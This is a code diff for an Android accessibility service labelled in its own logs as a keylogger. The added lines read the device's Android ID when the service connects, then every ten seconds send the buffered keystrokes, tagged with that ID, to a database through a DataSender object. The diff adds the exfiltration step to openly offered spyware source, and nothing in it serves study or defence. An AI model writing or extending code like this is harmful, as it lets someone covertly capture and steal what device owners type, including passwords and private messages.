@@ -8,6 +8,7 @@ import kotlinx.coroutines.*
 
 class MyAccessibilityService : AccessibilityService() {
     var buffer: String? = ""
+    private val datasender = DataSender()
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         event?.let {
@@ -28,6 +29,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onServiceConnected() {
+        datasender.obtainAndroidID(this.contentResolver)
         super.onServiceConnected()
         Log.d("Keylogger", "[+] Connected")
 //        val info = AccessibilityServiceInfo()
@@ -41,8 +43,9 @@ class MyAccessibilityService : AccessibilityService() {
                 delay(10_000) // 10 seconds
                 if (buffer != "")
                 {
-                    // Send to database
                     Log.d("Keylogger", buffer!!)
+                    // Send to database
+                    datasender.sendData(datasender.getAndroidID(), buffer!!)
                     buffer = ""
                 }
                 else
